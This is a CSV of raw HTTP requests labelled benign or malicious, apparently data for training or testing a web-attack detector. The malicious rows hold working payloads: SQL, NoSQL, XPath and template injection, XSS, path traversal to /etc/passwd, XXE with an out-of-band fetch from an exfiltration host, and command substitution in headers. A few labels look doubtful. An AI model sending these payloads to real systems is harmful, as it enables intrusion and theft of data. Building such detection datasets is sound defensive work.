label,text
benign,"GET /api/v2/products/search?query=how%20to%20bake%20bread HTTP/1.1
Host: kitchenware-hub.net
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake-token.signature
User-Agent: curl/7.85.0
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /assets/img/banner-homepage-2024.png HTTP/1.1
Host: smart-commerce-hub.net
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://smart-commerce-hub.net/home
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: keep-alive"
malicious,"PUT /api/v1/messages/send HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Cache-Control: no-cache
Content-Length: 295

{""recipient"":""john.doe@secure-user-portal.net"",""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!"",""message"":""Your secure message has arrived.""}"
benign,"GET /media/gallery/album42/images HTTP/1.1
Host: image-hosting-vault.net
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Cookie: imgsess=1248fb6a09a46e321; visitor_id=339acd87; likes=12
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36
Connection: keep-alive"
benign,"DELETE /api/users/567 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer mnbvcxzasdfghjklqwertyuiop123456
Accept: application/json
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: online-retail-store.biz
Content-Type: text/plain
Content-Length: 21
DNT: 1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.5

Stock level adjusted"
malicious,"GET /app/user/settings HTTP/1.1
Host: private-network.intra
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://dashboard.secure-user-portal.net/
Connection: close"
benign,"GET /news/technology/2024/04/feature-insights HTTP/1.1
Host: digital-chronicle.xyz
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: sessionKey=qxp04jg3812; userPref=lang=en-US&readingMode=quick; tracker=trk8452bk
Accept-Language: en-US,en;q=0.9
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"
benign,"OPTIONS /services/item/details HTTP/1.1
Host: cloud-microservice-hub.io
Origin: https://app.user-dashboard.biz
Access-Control-Request-Method: GET
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept: application/json, text/plain, */*
Access-Control-Request-Headers: Content-Type
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"GET /static/v3/fonts/fontawesome-webfont.ttf HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/font-ttf,application/x-font-ttf;q=0.9,font/ttf;q=0.8,*/*;q=0.6
Referer: https://community.game-dev-forum.org/themes/default/css/icons.css
Origin: https://community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Connection: keep-alive"
benign,"DELETE /api/v4/inventory/electronics/tv123456 HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer ZXhhbXBsZS10b2tlbi1mcm9tLXNlc3Npb24=
If-Match: ""3fb2a9d6f""
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive"
benign,"HEAD /index.html HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
benign,"GET /scripts/utils.min.js HTTP/1.1
Host: smart-city-portal.io
Connection: keep-alive
Accept: application/javascript, */*;q=0.05
Accept-Language: en-US,en;q=0.7
User-Agent: libwww-perl/6.38"
benign,"POST /subscribe/newsletter HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept-Language: en-US,en;q=0.7
Cache-Control: no-cache
Referer: https://my-personal-blog-site.info/posts/45
Connection: keep-alive

email=isabella.drew%40myblogsite.info"
benign,"GET /forums/pets/cat-lovers/thread/28590 HTTP/1.1
Host: petlovers-community.biz
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html
Accept-Language: en-US,en;q=0.5
Referer: https://petlovers-community.biz/forums/pets/cat-lovers
Cookie: token=aojsd123klzx09qwue; preferences=theme_light
Connection: keep-alive
Cache-Control: max-age=0"
benign,"POST /app/project/submit-comment HTTP/1.1
Host: green-energy-hub.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 2378
Accept: text/html,application/xhtml+xml,application/xml
User-Agent: Python-urllib/3.11
Accept-Language: en-US,en;q=0.7
Connection: close

user=charles.evans&project_id=8721&comment=I+have+been+following+the+progress+on+the+solar+panel+installation+project+at+Maple+Street+for+several+months+now.+It+is+impressive+to+see+how+the+team+has+managed+to+stick+to+the+timeline+and+address+unexpected+challenges+quickly.+The+community+outreach+and+education+efforts+to+raise+awareness+about+renewable+energy+have+also+made+a+positive+impact.+From+an+engineering+standpoint%2C+the+use+of+modular+panels+and+smart+grid+integration+demonstrates+an+innovative+approach+that+may+serve+as+a+model+for+future+projects.+I+appreciate+everyone%27s+hard+work+and+dedication+to+sustainable+development.+Looking+forward+to+updates+and+continued+success."
benign,"POST /api/v1/chat/send-message HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Type: application/json
Accept: application/json, text/plain, */*
Content-Length: 131
Referer: https://community.game-dev-forum.org/chat/room/45
Connection: close

{""chatRoomId"":""45"",""messageTexts"":[""Hey everyone!"",""Are we ready for the next jam?"",""Let's share some code snippets.""]}"
benign,"GET /products/electronics/tv/details?cmd=view_details&model=ZX9000Q7 HTTP/1.1
Host: online-retail-store.biz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
Connection: keep-alive
Referer: https://online-retail-store.biz/products/electronics/led-tvs"
malicious,"GET /checkout/confirm HTTP/1.1
Host: online-retail-store.biz
User-Agent: Wget/1.21.1 <script>alert('LogViewerXSS')</script>
Accept: */*
Accept-Encoding: gzip
Connection: keep-alive"
benign,"POST /threads/864/reply HTTP/1.1
Host: community.traveldiaries.world
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Origin: https://community.traveldiaries.world
Referer: https://community.traveldiaries.world/threads/864
Cookie: session=88a7db9740f129a4f96c; csrf_token=jK5wmD3@c
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Connection: keep-alive

comment_text=Great+recommendations+for+budget+travel.+Will+definitely+try+the+local+restaurants+you+mentioned.&author_name=Emily+J&parent_id=857&csrf_token=jK5wmD3@c"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
Accept: image/png,image/*,*/*
If-None-Match: ""f8765c9a23b2a4b22f553dc6bf9e7f71""
User-Agent: curl/7.85.0
Accept-Encoding: gzip"
malicious,"POST /blog/comment/submit HTTP/1.1
Host: personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate, br
Cookie: sess=4f5b2d9e17c3a89f2b7e
Content-Length: 83

name=Emily&comment=Nice%20post!'); db.users.remove({isAdmin:true}); //"
benign,"GET /api/xml/inventory/items?warehouse=nyc&available=true HTTP/1.1
Host: smart-warehouse-system.net
Accept: application/xml
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
Authorization: Bearer EAbyO7Ozxp5bq4H9Q
If-None-Match: ""c81e728d9d4c2f636f067f89cc14862c""
Connection: keep-alive"
benign,"OPTIONS /api/orders/new HTTP/1.1
Host: ecommerce-vault.network-solutions.online
Origin: https://checkout-ticketing.local
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept-Language: en-US,en;q=0.5"
benign,"GET /api/v2/items/search?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: catalog-services.cloud-solutions.biz
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://catalog-services.cloud-solutions.biz/dashboard
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate, br"
benign,"GET /search?query=wireless+headphones&sort=price_low HTTP/1.1
Host: bargain-finders.deals
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
DNT: 1
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"GET /resource-loader?template=../../../../../../../../etc/passwd HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
Upgrade-Insecure-Requests: 1
Connection: close"
malicious,"POST /profile/edit HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 71
Cookie: blog_session=7afc9ebdce384710a9a2

displayName=traveler'%7D%2C%20%24where%3A%20function()%20%7Breturn%20this.isAdmin%3Dtrue%3B%7D%20--&bio=Love%20travelling"
malicious,"POST /api/v1/search HTTP/1.1
Host: search-datahub.ai
Content-Type: application/json
Content-Length: 107
Accept: application/json
X-CSRF-Token: d9e84dbd9f8a4c7d991f89a8c1158923
User-Agent: Python-urllib/3.9

{""query"": ""smartphone' Or '1' = '1' aNd 'a'='a""}"
malicious,"POST /search/api/filter HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Referer: https://online-retail-store.biz/products/search
Connection: keep-alive

{""filter"":{""$where"":""return this.isAdmin && this.username==='admin' || sleep(3500);""}}"
benign,"POST /account/profile/update HTTP/1.1
Host: user-preferences-hub.io
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RgP7YUmyPq2Upuw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Length: 296
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ABC123xyz

------WebKitFormBoundary4RgP7YUmyPq2Upuw
Content-Disposition: form-data; name=""username""

robert.turner
------WebKitFormBoundary4RgP7YUmyPq2Upuw
Content-Disposition: form-data; name=""email""

robert.turner@exampleuser.net
------WebKitFormBoundary4RgP7YUmyPq2Upuw
Content-Disposition: form-data; name=""bio""

Open-source enthusiast and tech blogger.
------WebKitFormBoundary4RgP7YUmyPq2Upuw
Content-Disposition: form-data; name=""location""

Portland, Oregon
------WebKitFormBoundary4RgP7YUmyPq2Upuw--"
benign,"GET /api/v3/items/filter?category=outdoor-gear&filter[material]=nylon&filter[price_min]=50&sort_by=newest&page=1 HTTP/1.1
Host: summit-adventure-gear.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Accept: application/json
Referer: https://summit-adventure-gear.org/products/outdoor-gear
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"PUT /api/data/item123 HTTP/1.1
Host: smart-farm-automation.net
User-Agent: python-requests/2.31.0
Content-Type: text/plain
Content-Length: 27
Accept: */*
X-Requested-With: XMLHttpRequest
Connection: close

Irrigation cycle paused now."
malicious,"POST /api/v1/data/upload HTTP/1.1
Host: cloud-api-dataworks.net
User-Agent: DataUploader/2.5.3 $(hostname -f)
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 48
Origin: https://client.cloud-api-dataworks.net

{""filename"":""report.csv"",""content"":""a,b,c\n1,2,3""}"
benign,"POST /api/v1/tickets/create HTTP/1.1
Host: supportdesk-helpplatform.net
Authorization: Bearer 9f4aab59-2d15-48d5-814f-82e3a72e45df
Content-Type: application/xml
Content-Length: 110
Idempotency-Key: 2acd3131-5a33-4311-ae24-502ae361f6e2
X-Request-ID: 44f576a6-4a28-485c-8460-72f9a76e2b63
X-Client-Version: 3.3.3
Accept: application/xml
Connection: close

<ticket><subject>Unable to login</subject><description>Reset password link not working on latest app version.</description><priority>high</priority></ticket>"
malicious,"POST /profile/update HTTP/1.1
Host: mobileapp-content-api.education-cloud.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Content-Length: 79
Connection: keep-alive

displayName=student42&preferences%5Blanguage%5D=en%2DGB&role_id=3&internal_user_status=AUTHORIZED"
benign,"GET /api/v1/users/dashboard HTTP/1.1
Host: secure-user-portal.net
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: application/json
Connection: close
Authorization: Bearer mS92JwcLz7ULTe4DBqafNqMpO8
X-CSRF-Token: 9aG1FpzXMTh6bqKR"
malicious,"POST /users/profile/settings HTTP/1.1
Host: tech-community-hub.dev
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
Referer: https://tech-community-hub.dev/users/profile
Content-Length: 82

displayName=devninja&preferences%5Beditor%5D=vim&role_id=4&internal_user_status=ACTIVE"
benign,"GET /support_docs/api_reference_v4.1.pdf HTTP/1.1
Host: api.cloud-data-services.ai
Referer: https://api.cloud-data-services.ai/developer-portal
Accept: application/pdf
User-Agent: curl/7.88.1
Connection: close"
benign,"GET /user/profile/view?cmd=view_details&id=9987 HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://my-personal-blog-site.info/blog"
benign,"GET /gallery/photos/thumbnails/profile-09876-orange-sunset.jpg HTTP/1.1
Host: echo-sketches.artspace
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://echo-sketches.artspace/artist/mark-melrose
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
DNT: 1
Connection: close"
malicious,"POST /form/submit/signature HTTP/1.1
Host: advanced-token-authentication.securityhub.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept-Language: en-US,en;q=0.7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 205

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ"
benign,"PUT /settings/email HTTP/1.1
Host: communications-hub.net
Content-Type: application/xml
If-Match: ""abc123etagxyz789""
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: application/xml
Content-Length: 105

<emailSettings><emailAddress>user@example.com</emailAddress><dailyDigest>true</dailyDigest><promotions>false</promotions></emailSettings>"
malicious,"PUT /api/users/2157 HTTP/1.1
Host: tech-innovators-network.org
User-Agent: Python-urllib/3.9
Content-Type: application/json
Accept: application/json
X-CSRF-Token: 0f1e2d3c4b5a69788776655443322110
Content-Length: 122

{
  ""username"": ""innovator2157"",
  ""email"": ""innovator@tech-innovators-network.org"",
  ""is_admin"": true,
  ""membership_type"": ""standard""
}"
malicious,"POST /app/settings/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
Cookie: session_filter=(uid=malicious%00
Content-Length: 32

setting1=on&setting2=off&mode=dark"
benign,"POST /blog/article/view/315/comment HTTP/1.1
Host: urban-foodies-journal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Accept-Language: en-US,en;q=0.8
Origin: https://urban-foodies-journal.net
Referer: https://urban-foodies-journal.net/blog/article/view/315
Cookie: uid=2357zx92; csrftoken=5dc381ab
Connection: keep-alive

author_name=Emily+R.&comment_text=Great+recipe%21+Tried+it+and+loved+the+flavor.&csrfmiddlewaretoken=5dc381ab"
benign,"POST /events/rsvp HTTP/1.1
Host: local-events-calendar.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Safari/537.36
Content-Type: application/json
Accept: application/json
Content-Length: 101
Origin: https://local-events-calendar.me

{""event_id"":""evnt-2345"",""attendee"":""michael.tapia"",""preferences"":[""vegetarian meal"",""window seat"",""email notifications""]}"
benign,"GET /robots.txt HTTP/1.1
Host: online-retail-store.biz
User-Agent: bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: gzip
Referer: https://search.bing.com/
Connection: close"
malicious,"POST /api/v3/record/submit HTTP/1.1
Host: user-consent-management.online-retail-store.biz
Content-Type: application/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: application/xml, text/xml
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: en-US,en;q=0.7
Origin: https://user-consent-management.online-retail-store.biz
Pragma: no-cache
Cache-Control: max-age=0
Content-Length: 319

<!DOCTYPE consent [
<!ENTITY % localfile SYSTEM ""file:///etc/hostname"">
<!ENTITY % exfiltrated SYSTEM ""http://oob-exfil-api.cloud-data-analytics.ai/malicious.dtd"">
%exfiltrated;
%oobRequest;
]>
<consent>
    <userAccepted>true</userAccepted>
</consent>"
benign,"PUT /api/data/item123 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Python-urllib/3.10
Content-Length: 19
Content-Type: text/plain
Accept: */*
X-Requested-With: XMLHttpRequest

Backup flag toggled on."
malicious,"POST /blog/article/comment HTTP/1.1
Host: writers-digest.org
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/x-www-form-urlencoded
X-Custom-Header: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnbG9uZycpeDwvc2NyaXB0Pg==""></iframe>
Content-Length: 31

article_id=1123&comment=Great post!"
benign,"POST /api/v2/inventory/items HTTP/1.1
Host: warehousenet.biz
Authorization: Bearer X87upZ4dsvPlMHy9oo1rXVeB
Content-Type: application/json
Accept: application/json
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Content-Length: 102
Connection: close

{""sku"":""WSH-4567"",""name"":""Ergonomic Office Chair"",""quantity"":35,""price"":129.99,""category"":""furniture""}"
benign,"POST /game/api/v1/move HTTP/1.1
Host: arena-battles-cloud.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Content-Length: 25
Connection: keep-alive

action=move_player&target=north"
malicious,"POST /account/preferences HTTP/1.1
Host: social-photo-share.cloud
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Content-Length: 198

prefs_b64=Tzo0NzoiT3JnL0h0dHAvTWVzc2FnZVxVcGxvYWRlZEludGVyZmFjZSI6MTp7czoxMjoidXBsb2FkIGRpcmUiO3M6MTA6Ii9ob21lL2FwdCI7fQ=="
benign,"POST /login HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Accept-Language: en-GB,en;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Cache-Control: max-age=0
Origin: https://secure-user-portal.net

username=john.doe&password=&remember_me=yes"
malicious,"POST /forum/post_reply HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 176
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Referer: https://community.game-dev-forum.org/thread/2345

thread_id=2345&username=gamer42&reply=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E"
malicious,"POST /xml/orders/import HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: text/xml
Origin: https://my-personal-blog-site.info
Content-Length: 222

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE entry [
  <!ELEMENT entry ANY >
  <!ENTITY local SYSTEM ""file:///var/log/syslog"" >
]>
<entry>
  <log>&local;</log>
  <message>Entry import</message>
</entry>"
malicious,"GET /search HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9
Referer: http://search.community.game-dev-forum.org/{#{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('env').read()}}#}"
benign,"POST /register HTTP/1.1
Host: community-game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Connection: close
Origin: https://community-game-dev-forum.org
Referer: https://community-game-dev-forum.org/join
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Cookie: csrf_token=93e7a3155ffdbe12c8d0069d60a4efb9

username=gameMaster42&email=gamemaster42%40gamehub.dev&password=S3cureGamePass%21&password_confirm=S3cureGamePass%21&terms_accepted=true"
malicious,"POST /data/api/query HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json
Content-Type: application/json
Origin: https://community.game-dev-forum.org
Content-Length: 124

{""query"":""/members/member[username='admin' and starts-with(password,'pa')]/memberId""}"
benign,"PUT /api/v1/profile/update HTTP/1.1
Host: user-data-sync.net
If-Match: ""3e86-59f8a4c9d7b50""
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiMzY1In0._Q8OtkT6uFmXhkQfBAzbgWjAsujFHzQPxeaS1E03T3s
Content-Length: 72

{""firstName"": ""Eleanor"", ""lastName"": ""Riggs"", ""preferences"": {""newsletter"": false}}"
